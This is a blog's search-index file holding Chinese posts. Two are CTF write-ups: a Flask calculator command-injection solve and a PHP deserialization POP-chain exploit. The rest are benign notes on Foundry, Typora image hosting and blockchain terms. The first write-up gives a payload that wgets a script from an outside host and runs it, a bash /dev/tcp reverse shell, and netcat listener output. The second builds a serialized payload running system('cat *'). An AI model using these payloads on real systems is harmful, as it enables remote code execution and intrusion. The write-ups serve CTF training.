<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022DASCTF-calc</title>
    <url>/2022/04/19/DASCTF2022-calc/</url>
    <content><![CDATA[<h1 id="DASCTF-calc"><a href="#DASCTF-calc" class="headerlink" title="[DASCTF]-calc"></a>[DASCTF]-calc</h1><p>打开来是个计算器，没猜错应该要RCE</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">s</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure></div>

<p>过滤了一些命令常用的字符和函数，所以这里使用模板注入的机会不大，故专注于<code>os.system()</code>。另外，Linux命令常用的反引号没有被过滤，Python的注释符<code>#</code>也幸存了，由于<code>eval()</code>是执行一个Python的字符串表达式，为了不让它报错，需要用<code>#</code>把后面拼接的Linux命令注释掉。</p>
<h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h2><p>由于过滤了很多字符，且命令并无回显，所以这里用<code>wget</code>下载反弹shell的<code>sh</code>文件，然后运行</p>
<p>空格用%09绕过就好，也可以用<code>&gt;</code>等等，不多赘述</p>
<p>上传一个这样的shell文件到一个网站上</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&#123;IP&#125;/&#123;PORT&#125; 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>

<p>让目标机器保存在<code>/tmp</code>下，然后执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">num=7*7%23`wget%09-P%09/tmp%09http://vveelin.com.cn:89/bsh.sh`</span><br><span class="line">num=7*7%23`sh%09/tmp/bsh.sh`</span><br></pre></td></tr></table></figure></div>

<p>攻击机监听对应端口，getshell</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ecs-394098 ~]<span class="comment"># nc -lvnp 4444</span></span><br><span class="line">Ncat: Connection from 117.21.200.166.</span><br><span class="line">Ncat: Connection from 117.21.200.166:62378.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line"></span><br><span class="line">root@out:/<span class="comment"># cat Th1s_is__F1114g</span></span><br><span class="line">cat Th1s_is__F1114g</span><br><span class="line">flag&#123;16c2218b-4113-411e-b64a-30dd12604d3c&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2022DASCTF-ezpop</title>
    <url>/2022/04/19/DASCTF2022-ezpop/</url>
    <content><![CDATA[<h1 id="DASCTF-ezpop"><a href="#DASCTF-ezpop" class="headerlink" title="[DASCTF]-ezpop"></a>[DASCTF]-ezpop</h1><p>一道简单的php反序列化题目</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">	    <span class="keyword">$this</span>-&gt;v1-&gt;world();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">	    <span class="keyword">$this</span>-&gt;a-&gt;run();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123; unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>发现没有<code>__wakeup()</code>和<code>__construct()</code>，那么最先被调用的应该就是<code>fin</code>类里面的<code>__destruct()</code>方法了。</p>
<h2 id="构造POP链"><a href="#构造POP链" class="headerlink" title="构造POP链"></a>构造<code>POP</code>链</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fin::__destruct()    # 其中的echo触发__toString()</span><br><span class="line">↓</span><br><span class="line">what::__toString()   # 调用run()</span><br><span class="line">↓</span><br><span class="line">mix::run()           # 将f1以函数方式调用，触发__invoke()</span><br><span class="line">↓</span><br><span class="line">crow::__invoke()     # 调用不存在的方法world()，触发__call()</span><br><span class="line">↓</span><br><span class="line">fin::__call()        # 调用get_flag()</span><br><span class="line">↓</span><br><span class="line">mix::get_flag()      # 这里在命令前加了一个注释符，用换行符绕过即可</span><br></pre></td></tr></table></figure></div>

<h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造<code>Payload</code></h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v1</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;v1 = <span class="variable">$v1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f1</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;f1 = <span class="variable">$f1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$m1</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;m1 = <span class="variable">$m1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> mix(<span class="string">&quot;\nsystem(&#x27;cat *&#x27;);&quot;</span>);</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> fin(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> crow(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> mix(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> what(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> fin(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>

<p>输出</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure></div>

<p>拿到flag</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//flag&#123;43282d76-6cb5-4e5c-9286-48e8688c6853&#125;</span><br><span class="line">not here, but it&#x27;s close, think more.not here, but it&#x27;s close, think more.not here, but it&#x27;s close, think more.not here, but you are almost getting the flag!</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Foundry 工具的使用笔记</title>
    <url>/2023/11/07/Foundry%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.</p>
<p>Foundry 是一个极快、可移植和模块化的工具包，用于用 Rust 编写的以太坊应用程序开发。</p>
<h2 id="Forge-的使用"><a href="#Forge-的使用" class="headerlink" title="Forge 的使用"></a>Forge 的使用</h2><p>Forge Standard Library (Forge Std for short) is a collection of helpful contracts that make writing tests easier, faster, and more user-friendly.</p>
<p>Forge Standard Library（简称 Forge Std）是有用的合同集合，使编写测试更容易、更快速、更用户友好。</p>
<h3 id="init-创建并初始化新项目"><a href="#init-创建并初始化新项目" class="headerlink" title="init 创建并初始化新项目"></a>init 创建并初始化新项目</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ forge init test_project</span><br></pre></td></tr></table></figure></div>

<p>由默认模板创建一个新目录 test_project，并初始化一个新的 git 仓库。</p>
<p>使用 –templates 参数可以从其他模板创建新项目。</p>
<p>默认模板目录结构如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree . -d -L 1</span><br><span class="line">.</span><br><span class="line">├── cache    // 编译用，缓存</span><br><span class="line">├── lib      // 自带Forge标准库</span><br><span class="line">├── out      // 测试后生成，包含合约工件，如ABI</span><br><span class="line">├── script   // 用于部署合约的脚本</span><br><span class="line">├── src      // 存放合约代码</span><br><span class="line">└── <span class="built_in">test</span>     // 测试合约代码</span><br><span class="line"></span><br><span class="line">6 directories</span><br></pre></td></tr></table></figure></div>

<h3 id="test-测试项目"><a href="#test-测试项目" class="headerlink" title="test 测试项目"></a>test 测试项目</h3><p>测试需要项目中有待测合约，和用于执行测试的测试合约。任何具有 test 开头的函数的合约都会被认为是测试合约，一般会放在项目的 test&#x2F; 目录下，并以 <code>.t.sol</code> 结尾。</p>
<p>待测合约：Counter.sol</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Counter &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line"></span><br><span class="line">    function setNumber(uint256 newNumber) public &#123;</span><br><span class="line">        number = newNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increment() public &#123;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>测试合约：Counter.t.sol</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &#123;Test, console2&#125; from &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &#123;Counter&#125; from &quot;../src/Counter.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CounterTest is Test &#123;</span><br><span class="line">    Counter public counter;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        counter = new Counter();</span><br><span class="line">        counter.setNumber(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_Increment() public &#123;</span><br><span class="line">        counter.increment();</span><br><span class="line">        assertEq(counter.number(), 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testFuzz_SetNumber(uint256 x) public &#123;</span><br><span class="line">        counter.setNumber(x);</span><br><span class="line">        assertEq(counter.number(), x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>测试用法如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ forge <span class="built_in">test</span></span><br><span class="line">// 测试当前项目</span><br><span class="line"></span><br><span class="line">$ forge <span class="built_in">test</span> --match-contract &lt;待测合约&gt; --match-test &lt;测试合约&gt;</span><br><span class="line">// 测试筛选出的合约</span><br></pre></td></tr></table></figure></div>

<p>可以看到测试函数中除了调用被测合约的函数以外，还有用于验证测试结果的 assert() 函数，示例中是 assertEq()，用于判断两个参数是否相等：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function assertEq(int a, int b) internal &#123;</span><br><span class="line">    if (a != b) &#123;</span><br><span class="line">        emit log(&quot;Error: a == b not satisfied [int]&quot;);</span><br><span class="line">        emit log_named_int(&quot;      Left&quot;, a);</span><br><span class="line">        emit log_named_int(&quot;     Right&quot;, b);</span><br><span class="line">        fail();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>若是判断不符合预期，就会测试失败。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>Typora图片自动上传Github图床</title>
    <url>/2022/04/28/Typora%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0GitHub%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>平时比起一些花里胡哨的编辑器（如Obsidian），我还是更喜欢用Typora编辑markdown，分享一下Typora复制图片上传图床的技巧</p>
<h2 id="0x01-Github仓库作为图床"><a href="#0x01-Github仓库作为图床" class="headerlink" title="0x01 Github仓库作为图床"></a>0x01 Github仓库作为图床</h2><p>这里需要创建一个 <code>Repositories </code>(仓库)作为图床，登录GitHub进入个人页，在左边会有添加 <code>Repositories </code>的选项，点进去进入创建仓库的界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/TyporaPics/img/202204280322781.png"
                      alt="image-20220428032248413"
                ></p>
<p>创建的界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/TyporaPics/img/202204280323325.png"
                      alt="image-20220428032349070"
                ></p>
<ul>
<li><code>Repository name</code>处就填你想要的库名称，比如我的就叫 <code>TyporaPics</code></li>
<li><code>Description</code>那里随便写个描述就可以</li>
<li>权限那里要选择 <code>Public</code></li>
<li>记得勾选上<code>Add a README file</code>，是为了避免一大堆麻烦</li>
</ul>
<p>以上完成了就可以点击创建了</p>
<p>然后这边顺便拿一下 <code>token</code>吧，点击头向下拉栏的 <code>Settings</code>，再选择设置里的 <code>Developer settings</code>，进入 <code>Personal access tokens</code>，点击创建，底下的一大堆权限只需要勾上<code>repo</code>就可以了</p>
<p>注意：拿到 <code>token</code>后一定要妥善保存，这是它唯一一次能被看到！</p>
<h2 id="0x02-PicGo配置"><a href="#0x02-PicGo配置" class="headerlink" title="0x02 PicGo配置"></a>0x02 PicGo配置</h2><p>下载安装 <code>PicGo</code>，进入里面 <code>GitHub</code>图床的配置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/TyporaPics/img/202204280339616.png"
                      alt="image-20220428033916240"
                ></p>
<p>自定义域名那里的 <code>https://cdn.jsdelivr.net/gh/</code>是<code>cdn</code>的加速服务</p>
<p>图床这里设置完毕后，进入<code>PicGo</code>设置把“时间戳重命名”和“上传后自动复制URL”这两个选项开启， <code>PicGo</code>这边就OK了</p>
<h2 id="0x03-Typora配置"><a href="#0x03-Typora配置" class="headerlink" title="0x03 Typora配置"></a>0x03 Typora配置</h2><p>在“偏好设置”中找到“图像”，在“上传服务”处选择 <code>PicGo(app)</code>，并选好相应的路径，然后验证一下成不成功，如果想要一插入图片就自动上传的话可以在<code>“插入图片时...”</code>那里选择<code>上传图片</code>，我个人比较喜欢留一些缓冲的余地，在默认状况下，插入文件后会有按钮选项出现，点一下即可上传</p>
]]></content>
      <categories>
        <category>小妙招</category>
      </categories>
  </entry>
  <entry>
    <title>区块链安全基础备忘</title>
    <url>/2023/10/05/%E5%9F%BA%E7%A1%80%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h2 id="基础名词"><a href="#基础名词" class="headerlink" title="基础名词"></a>基础名词</h2><h3 id="钱包-Wallet"><a href="#钱包-Wallet" class="headerlink" title="钱包 Wallet"></a>钱包 Wallet</h3><p>是一个管理私钥的工具，允许通过其检查、存储、交易持有的数字货币。它是进入区块链世界的基础设施和重要入口。</p>
<ul>
<li><strong>冷钱包 Cold Wallet：</strong>离线钱包，通过生成数字货币的地址和私钥再保存实现存储。</li>
<li><strong>热钱包 Hot Wallet：</strong>在线钱包，使用较方便。</li>
</ul>
<h3 id="公链"><a href="#公链" class="headerlink" title="公链"></a>公链</h3><p>公有链（Public Blockchain）简称公链，是指任何人都可随时进入读取、任何人都能发送交易且能获得有效确认的共识区块链</p>
<h3 id="交易所-Exchange"><a href="#交易所-Exchange" class="headerlink" title="交易所 Exchange"></a>交易所 Exchange</h3><p>数字货币买卖交易的平台。</p>
<ul>
<li><p><strong>去中心化交易所：</strong></p>
<p>交易行为直接发生在区块链上，数字货币会直接发挥使用者的钱包，或是保存在区块链上的智能合约。目前市面上去中心化交易所有WhaleEx、Bancor、dYdX等。</p>
</li>
<li><p><strong>中心化交易所：</strong></p>
<p>目前热门交易所大多采用中心化技术，使用者在平台注册，并经过一连串的身份验证程序（KYC）后，就可以在平台交易数字货币。在使用其交易数字货币时，其货币交换不见得会发生在区块链上，可能仅是修改交易所数据库内的资产数字，交易所只需要在用户提款时准备充足的数字货币供汇出即可。当前的主流交易大部分是在中心化交易所内完成的，目前市面上的中心化交易所有币安、火币、OKEx等。</p>
</li>
</ul>
<h3 id="共识-Consensus"><a href="#共识-Consensus" class="headerlink" title="共识 Consensus"></a>共识 Consensus</h3><p>主要解决分布式系统中，多个节点之间对某个状态达成一致性的问题。</p>
<ul>
<li><p><strong>工作量证明 PoW（Proof of Work）：</strong></p>
<p>是历史上第一个成功的去中心化区块链共识算法，被比特币、以太坊、莱特币等主流公链广泛使用。</p>
<p>其要求节点参与者执行计算密集型的任务，但是对于其他网络参与者易于验证。在比特币的例子中，矿工竞相向由整个网络维护的区块链账本中添加所收集到的交易，即区块。为了做到这一点，矿工必须第一个准确计算出“nonce”，这是一个添加在字符串末尾的数字，用来创建一个满足开头特定个数为零的哈希值。不过存在采矿的大量电力消耗和低交易吞吐量等缺点。</p>
</li>
<li><p><strong>权益证明 PoS（Proof of Stake）：</strong></p>
<p>权力证明机制，一种主流的区块链共识算法，目的是为了让区块链里的分布式节点达成共识，它往往和工作量证明机制（PoW）一起出现。</p>
<p>它通过持币人的统一来达成共识，目的是确定出新区块，这过程相对于PoW，不需要硬件和电力，效率更高。PoS 共识中引入了 Stake 的概念，持币人将代币进行 Staking，要求所有的参与者抵押一部分他们所拥有的 Token 来验证交易，然后获得出块的机会，PoS 共识中会通过选举算法，按照持币量比例以及 Token 抵押时长，或者是一些其他的方式，选出打包区块的矿工。矿工在指定高度完成打包交易，生成新区块，并广播区块，广播的区块经过 PoS 共识中另外一道”门槛”，验证人验证交易，通过验证后，区块得到确认。</p>
<p>这样一轮 PoS 的共识过程就进行完成了。权益证明通过长期绑定验证者的利益和整个网络的利益来阻止不良行为。锁定代币后，如果验证者存在欺诈性交易，那么他们所抵押的 Token 也会被削减。</p>
</li>
<li><p><strong>委托权益证明 DPoS（Delegate Proof of Stake）：</strong>在委托权益证明中，让每一个持币者都可以进行投票，由此产生一定数量的代表，他们彼此之间的权利是完全相等的。</p>
